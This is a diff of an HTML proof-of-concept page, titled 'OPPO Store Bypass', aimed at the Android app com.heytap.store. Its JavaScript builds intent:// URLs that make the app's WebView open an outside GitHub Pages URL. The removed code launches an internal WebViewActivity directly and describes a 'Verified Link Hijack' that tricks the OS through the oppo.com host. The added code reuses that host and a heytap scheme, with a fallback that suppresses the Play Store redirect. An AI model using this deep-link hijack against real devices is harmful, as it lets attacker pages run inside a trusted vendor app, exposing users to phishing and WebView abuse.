@@ -3,24 +3,24 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>OPPO Store Bypass Test</title>
+    <title>OPPO Store Bypass</title>
     <style>
-        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f4f4f4; }
-        .btn { width: 100%; max-width: 350px; padding: 20px; margin: 10px 0; font-size: 16px; font-weight: bold; color: white; border: none; border-radius: 15px; cursor: pointer; box-shadow: 0 4px 6px rgba(0,0,0,0.2); }
-        .red { background-color: #d32f2f; }
-        .blue { background-color: #1976d2; }
+        body { font-family: sans-serif; text-align: center; padding: 20px; background-color: #f0f0f0; }
+        .btn { width: 100%; max-width: 350px; padding: 20px; margin: 10px 0; font-size: 16px; font-weight: bold; color: white; border: none; border-radius: 12px; cursor: pointer; }
+        .v1 { background-color: #008f39; }
+        .v2 { background-color: #1a1a1a; }
         #log { text-align: left; background: #fff; padding: 15px; font-family: monospace; font-size: 12px; margin-top: 20px; border: 1px solid #ddd; }
     </style>
 </head>
 <body>
 
-    <h2>OPPO Store Bypass</h2>
+    <h2>OPPO Store Deep Link</h2>
     <p>Target: <b>com.heytap.store</b></p>
 
-    <button class="btn red" onclick="triggerDirect()">1. Direct Component Launch</button>
-    <button class="btn blue" onclick="triggerOppoLink()">2. Verified Link Hijack</button>
+    <button class="btn v1" onclick="launchBypass()">Attempt App Launch (No Play Store)</button>
+    <button class="btn v2" onclick="launchLegacy()">Attempt Legacy Scheme</button>
 
-    <div id="log">Logs:<br></div>
+    <div id="log">Status Log:<br></div>
 
     <script>
         const myUrl = "https://pk009900.github.io/my-oppo-test/";
@@ -31,17 +31,17 @@
             document.getElementById("log").innerHTML += "> " + msg + "<br>";
         }
 
-        function triggerDirect() {
-            log("Attempting Direct Activity Launch...");
-            // This bypasses URL verification by targeting the internal Activity class
-            const intent = `intent://${myUrl}#Intent;action=android.intent.action.VIEW;package=${pkg};component=${pkg}/com.heytap.store.webview.WebViewActivity;end`;
+        function launchBypass() {
+            log("Attempting launch with Play Store block...");
+            // The magic is 'S.browser_fallback_url=javascript:history.back()'
+            // This stops Chrome from opening the Play Store if the link fails
+            const intent = `intent://www.oppo.com/index.html?url=${myUrl}#Intent;scheme=https;package=${pkg};S.browser_fallback_url=javascript:history.back();end`;
             window.location.href = intent;
         }
 
-        function triggerOppoLink() {
-            log("Attempting Verified Link Hijack...");
-            // Uses the verified host 'www.oppo.com' to trick the OS into opening the app
-            const intent = `intent://www.oppo.com?url=${myUrl}#Intent;scheme=https;package=${pkg};end`;
+        function launchLegacy() {
+            log("Attempting legacy custom scheme...");
+            const intent = `intent://web?url=${myUrl}#Intent;scheme=heytap;package=${pkg};S.browser_fallback_url=javascript:history.back();end`;
             window.location.href = intent;
         }
 
